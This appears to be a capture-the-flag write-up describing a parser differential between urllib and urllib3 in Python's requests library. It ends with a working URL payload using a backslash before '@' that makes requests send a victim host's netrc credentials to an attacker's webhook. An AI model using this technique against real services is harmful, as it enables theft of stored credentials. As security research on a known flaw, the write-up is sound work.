The requests library has a parser differential between retrieving netrc credentials (which uses urllib) and sending the HTTP request (which uses urllib3).

In [urllib](https://github.com/python/cpython/blob/3.14/Lib/urllib/parse.py#L418-L424), `_splitnetloc()` only stops on `/?#` and not `\`:

```py
def _splitnetloc(url, start=0):
    delim = len(url)   # position of end of domain part of url, default is end
    for c in '/?#':    # look for delimiters; the order is NOT important
        wdelim = url.find(c, start)        # find first of this delim
        if wdelim >= 0:                    # if found
            delim = min(delim, wdelim)     # use earliest delim position
    return url[start:delim], url[delim:]   # return (domain, rest)
```

and the hostname/userinfo are derived from the last `@`:
```py
    @property
    def _userinfo(self):
        netloc = self.netloc
        userinfo, have_info, hostinfo = netloc.rpartition('@')
        if have_info:
            username, have_password, password = userinfo.partition(':')
            if not have_password:
                password = None
        else:
            username = password = None
        return username, password


    @property
    def _hostinfo(self):
        netloc = self.netloc
        _, _, hostinfo = netloc.rpartition('@')
        _, have_open_br, bracketed = hostinfo.partition('[')
        if have_open_br:
            hostname, _, port = bracketed.partition(']')
            _, _, port = port.partition(':')
        else:
            hostname, _, port = hostinfo.partition(':')
        if not port:
            port = None
```
but in [urllib3](https://github.com/urllib3/urllib3/blob/main/src/urllib3/util/url.py#L17-L24), the regex for the authority excludes the backslash with `[^\\/?#]*`:

```py
_URI_RE = re.compile(
    r"^(?:([a-zA-Z][a-zA-Z0-9+.-]*):)?"
    r"(?://([^\\/?#]*))?"
    r"([^?#]*)"
    r"(?:\?([^#]*))?"
    r"(?:#(.*))?$",
    re.UNICODE | re.DOTALL,
)
```

before splitting at `@`:
```py
scheme, authority, path, query, fragment = _URI_RE.match(url).groups()
  normalize_uri = scheme is None or scheme.lower() in _NORMALIZABLE_SCHEMES

  if scheme:
      scheme = scheme.lower()

  if authority:
      auth, _, host_port = authority.rpartition("@")
      auth = auth or None
      host, port = _HOST_PORT_RE.match(host_port).groups()
```

with `Url.__new__()` normalising the non-empty path to start with a `/`:

```py
def __new__(cls, scheme=None, auth=None, host=None, port=None,
              path=None, query=None, fragment=None):
      if path and not path.startswith("/"):
          path = "/" + path
      if scheme is not None:
          scheme = scheme.lower()
      return super().__new__(cls, scheme, auth, host, port, path, query, fragment)
```

So for `http://attacker.com\@victim.com`, urllib keeps `attacker.com\@victim.com` as netloc, so the host ends up being `victim.com`. urllib3 stops at `\`, so the host becomes `attacker.com` and `\@victim.com` becomes the path.

Therefore, putting `https://subdomain.webhook.site\@feedback.nusgreyhats.org/` in the feedback will leak the flag to our webhook.
